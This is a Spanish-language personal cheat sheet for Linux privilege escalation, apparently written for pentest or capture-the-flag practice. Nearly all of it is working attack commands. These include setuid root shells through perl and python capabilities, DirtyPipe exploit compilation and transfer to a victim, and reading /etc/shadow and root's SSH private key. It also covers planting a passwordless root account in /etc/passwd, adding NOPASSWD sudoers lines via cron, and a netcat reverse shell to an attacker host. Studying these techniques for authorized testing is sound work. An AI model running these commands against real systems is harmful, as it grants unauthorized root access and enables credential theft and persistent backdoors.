# Escalacion de privilegios Linux

❯ **sudo -l** Ver que permisos tenemos en el sudoers (l=ele)
	(ALL : ALL) ALL
	(root) NOPASSWD: /usr/bin/find -> Puede ejecutar un comando sin necesidad de password
	* GTFOBins [GTFOBins](https://gtfobins.github.io/)

❯ **su root** Para convertirnos en root y debemos de proporcionar una passwd
❯ **uname -a** Miramos informacion del Kernel
❯ **id** Para ver si estamos en un grupo especial

❯ **find / -perm -4000 2>/dev/null** Buscaremos por privilegios suid
* pkexec -> Podriamos usar el Pwkit


❯ **which getcap** Para ver si esta instalado el Getcap y mirar las capabilities
❯ **getcap -r / 2>/dev/null** Listamos las capabilities que existan desde la raiz de forma recursiva y buscamos el comando aqui GTFOBins [GTFOBins](https://gtfobins.github.io/)
* **/usr/bin/perl = cap_setuid+ep** Esta capabilitie nos permite gestionar el UID
	❯ **setcap cap_setuid+ep /usr/bin/perl** 
	❯ **perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'** Para conseguir la consola interactiva

**Apparmor** que es modulo de seguridad del Kernel Linux que permite al administrador del sistema restringir las capabilities de un programa. En esta ocasion nos restringe la capabilitie de Perl. Pero podemos hacer lo siguiente:
❯ **touch prueba.sh** Creamos el archivo y nos ayudara a tener una consola interactiva aprovechandonos del Shebang que son #!
	#!/usr/bin/perl
	**use POSIX qw(setuid);**
	**POSIX::setuid(0);**
	**exec "****/bin/sh";
❯ **chmod** **+x prueba.sh** la ejecucion
❯ **./prueba.sh** Ejecutamos el comando anterior.
****
* **/usr/bin/python3.9 = cap_setuid+ep** Esta capabilitie nos permite gestionar el UID para convertirnos en Root (ID=0)
	❯ **setcap cap_setuid+ep /usr/bin/python3.9** Agregas la capabilitie a la ruta python
	❯ **setcap -r /usr/bin/pthon3.9** Le quitas la capabilitie a la ruta de python
	❯ **python3.9**
		**❯ import os**
		**❯ os.setuid(0)** – (0= el usuario root)
		**❯ os.system(“/bin/sh”)** Entras a una sh



❯










- **LinPEAS github** ->  Lo descargamos y al momento de ejecutarlo, nos muestra vias potenciales para escalar privilegios, debemos hacerlo desde una bash
	- Comando -> **nc -nlvp 4646 | bash** Para que al momento de recibir el codigo, lo interprete y lo ejecute 
	- Comando -> **curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > /dev/tcp/IP Victim/4646**
Si te reporta algunas cosas en naranja, quiere decir que son vias potenciales para escalar privilegios

Con Dirty-Pipe del siguiente repo https://github.com/arinerron/CVE-2022-0847-DirtyPipe-Exploit Esto servira a partir del Kernel 5.8
Debemos de traerlo a nuestra maquina de atacnte 
- Comando -> **git clone https://github.com/arinerron/CVE-2022-0847-DirtyPipe-Exploit** 
- Comando -> **gcc exploit.c -o exploit** Creas el compilado
- Comando -> **python3 -m http.server 80** Pasas el compilado a la maquina victima, colocando un servidor 
Debemos de colocarnos el maquina victima en la carpeta de /tmp/
- Comando -> **wget http://10.10.14.12/exploit** En la maquina victima cargas el compilado 

Si no tiene wget lo podemos hacer con Netcat 
- Comando -> **nc -nlvp 443 < exploit** Mandaremos el archivo por netcat, desde nuestra maquina de atacante
- Comando -> **nc 10.10.14.12 443 > exploit** En la maquina victima cargamos el archivo, Colocamos la IP de nuestra maquina de atacante

Si no funciona lo mandamos por base64
- Comando -> **base64 -w 0 exploit; echo** Con echo podremos ver el resultado de la codificacion en base64, solo debmos copiarlos y lo pegamos en la maquina victima  
- Comando -> **echo "resultado del comando de arriba" | base64 -d > dirtypipe** Hacemos que lo decodifique con base64 y lo colocamos en un archivo llamado DirtyPipe
- Comando -> **chmod +x dirtypipe** Le damos permisos de ejecucion 
- Comando -> **./dirtypipe** Lo ejecutamos esperando a que nos de Shell como Root

- Comando -> **find / -perm -4000 -user root 2>/dev/null** Buscaremos por privilegios suid, para aprovecharnos de un binario y escalar privilegios pero en este caso del usuario root
	Encontrar **/usr/local/bin/backup** Es un script que podemos usar
	
- Comando -> **find / -perm -4000 -user root -ls 2>/dev/null** Buscaremos por privilegios suid, para aprovecharnos de un binario y escalar privilegios pero en este caso del usuario root, tambien nos reportara el usuario, grupo y permisos




Otra que podemos encontrar en las capabilities es un tac: El tac es un cat pero te muestra el contenido al reves
	***/usr/bin/tac* = cap_dac_read_search+ei** Con esta capabilitie podemos utilizar ese comando para poder leer cualquier archivo privilegiado del sistema
	- Comando -> **tac < File>** Podemos colocar un archivo de alguna ruta como /etc/shadow, /root/.ssh/id_rsa, etc... o un file directamente y lo hara como root 
	Tambien pordemos conectarnos al usuario root obteniendo su clave privada de la siguente manera:
			- Comando -> **tac /root/.ssh/id_rsa | tac** Podemos ver la clave privada del usuario root, colocarla en un archivo que se llame id_rsa y asi podernos conectar por ssh con esa id_rsa, colocandole el privilegio 600, le ponemos doble tac para que se vea como un cat 



- Comando -> **find / -writable 2>/dev/null | grep -vE "/var|/run|/dev|/tmp|/lib|/proc|/sys"** Buscamos archivo desde la raiz con capacidad de escritura y los errores los ocultamos, ademas de quitar (vE=quitas multiples palabras) vas,dev,run, etc... y al final encontraremos **/etc/passwd**
- Comando -> **find / -writable -ls 2>/dev/null | grep -vE "/var|/run|/dev|/tmp|/lib|/proc|/sys"** Buscamos archivo desde la raiz con capacidad de escritura y los errores los ocultamos, ademas de quitar (vE=quitas multiples palabras) vas,dev,run, etc... y al final encontraremos **/etc/passwd**, con ls podemos ver el propietario y si el grupo otros pueden modificarlo (w=write)
		Si podemos entrar al **/etc/passwd** podemos ponerle al usuario root una passwd directamente hasheada de forma hardcodeada, para que al momento de hacer un **sudo su** compare directamente con lo que colocamos y no lo lea del **/etc/shadow**
	- Comando -> **openssl passwd** Creamos una passwd en formato DES(unix), y este lo colocaremos en la parte verde de root:**x**:0:0 y guardamos el archivo


- Comando -> **cat /etc/crontab** Tareas CRON, que son tareas que se ejecutan a intervalos regulares de tiempos en el sistema 
	Si miramos esta ruta en el file **\*/S * * * * root /writable/script.sh** Podemos escribir lo que sea dentro de ese archivo y asi ganar privilegio: 
		**echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers** Hacemos que no nos pida la passwd
		**nc < IP> < PORT> -e /bin/sh** Para poder hacer una revershell
		**echo "newRoot::0:0:newRoot:/home/newRoot:/bin/sh" >> /etc/passwd** Para poder tener acceso a todo



- Comando -> **cd .ssh** Nos dirigimos al dir SHH que contiene un archivo con la clave privada **id_rsa (clave privada)**, este se encuentra en **home/user/.ssh/id_rsa** o la publica **home/user/.ssh/id_rsa.pub** o las **home/user/.ssh/authorized_keys**
	- **nano** **id_rsa** Creamos el archivo y le pegamos el contenido del id_rsa que habiamos encontrado en la maquina victima
	- **chmod 600** **id_rsa** Le cambiamos los privilegios para poderla usar el archivo
	- **ssh -i** **id_rsa** **< USER>@< IP>** Conectarnos con el id_rsa a la maquina victima por medio de ssh sin proporcionar la password
- Comando -> **ssh < user>@localhost** Por lo que cuando tenemos un authorized_keys podemos entrar por SSH sin proporcionar passwd en forma local 


- Comando -> **ps -faux** Listas los procesos que corren en la maquina Linux
Encontramos un **tightvnc**. Esto es una aplicacion informatica de codigo abierto para administracion remota multiplataforma que utiliza el protocolo RFB deVNC para controlar panatlla de otro equipo de forma remota. Y los puerto que comunmente corre es el 5900-5901, 5800-5801
	Seguimos los pasos de la parte del Port Forwardin Dinamico



- Comando -> **ps aux | grep "^root"** Mostrara todos los procesos que estan corriendo como root

Path Hajacking -> Sirve para secuestrar el path y hacer que el comando que vas a ejecutar lo busque en la ruta que quieres.

- Comando -> **find .** Para ver archivos y sus extensiones y asi ver si podemos ejecutar alguno

En lugar de **pspy**, nosotros creamos nuestro propio script para ver lor procesos nuevos, antiguos, asi como comandos y ver cual proceso nos puede ayudar a escalar privilegios.
Podemos hacer el script o podemos ejecutar el comando asi solo: **ps -eo command**
- Comando -> **nano file.sh**
	#!/bin/bash
	
	funtion ctrl_c(){
		echo -e "\\n[!] Saliendo \\n"
		tput cnorm; exit 1
	}
		
	\# Ctrl + c
	trap ctrl_c INT
	tput civis
	old_process="\$(ps -eo command)"

	while true; do
		new_process="\$(ps -eo command)"
		diff <(echo "\$old_process")<(echo "\$new_process") | grep "[\>\<]" | grep -vE "command|procmon|kworker
		old_process=\$new_process
	done	
Despues encontramos un archivo que lo esta ejecutando root y otros lo pueden modificar 
- Comando -> **nano /opt/tmp.py**
	os.system('chmod u+s /bin/bash')
Modificando esa parte le diremos que otorgue el privilegio usid a la bash, para que cuando lo ejecute le pondra el s asi: -rw**s**r-xr-x root root 
- Comando -> **bash -p** Para ejecutar la bash con privilegios (p=priviledge) y atentara contra el propietario root
El comando ps nos permite detectar todos los comandos y procesos que se estan ejecuatndo en el sistema
